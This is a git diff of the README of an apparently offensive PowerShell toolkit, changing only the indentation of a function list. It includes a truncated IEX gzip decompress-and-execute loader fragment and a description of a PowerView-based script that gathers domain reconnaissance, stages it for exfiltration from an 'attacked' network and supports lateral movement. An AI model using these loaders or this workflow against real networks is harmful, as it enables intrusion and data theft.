@@ -20,10 +20,10 @@ IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Com
 
 - **`Export-ReconData.ps1`** - Powershell script leveraging [PowerSploit Recon](https://github.com/PowerShellMafia/PowerSploit) module (PowerView) to save output from Reconnaissance cmdlets like `Get-Net*`, `Invoke-*` into _Clixml_ files. Those files can later be extracted from attacked environment and loaded to a new powershell runspace using the same script. Very useful when we want to obtain as many data as possible, then exfiltrate that data, review it in our safe place and then get back to attacked domain for lateral spread.
 
-Exposed functions:
-- `Export-ReconData` - Launches many cmdlets and exports their Clixml outputs.
-- `Import-ReconData -DirName <DIR>` - Loads Clixml previously exported outputs and stores them in Global variables reachable when script terminates.
-- `Get-ReconData -DirName <DIR>` - Gets names of variables that were created and contains previously imported data.
+    Exposed functions:
+    - `Export-ReconData` - Launches many cmdlets and exports their Clixml outputs.
+    - `Import-ReconData -DirName <DIR>` - Loads Clixml previously exported outputs and stores them in Global variables reachable when script terminates.
+    - `Get-ReconData -DirName <DIR>` - Gets names of variables that were created and contains previously imported data.
 
 ```
 PS E:\PowerSploit\Recon> Load-ReconData -DirName .\PowerView-12-18-2018-08-30-09
